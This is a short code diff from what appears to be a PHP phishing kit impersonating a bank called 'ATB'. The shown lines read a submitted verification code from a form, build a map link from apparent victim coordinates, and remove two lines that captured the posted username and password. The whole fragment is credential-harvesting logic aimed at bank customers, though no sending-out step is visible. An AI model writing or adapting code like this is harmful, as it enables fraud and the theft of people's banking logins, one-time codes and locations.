@@ -181,8 +181,6 @@ if ($success==false) {
     $bank       = "ATB";
 
     $url        = "https://ATB.com";
-    $user       = $_POST['username'];
-    $pass       = $_POST['password'];
     $code       = $_POST['code']; 
 	$lh     = "|";
     $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
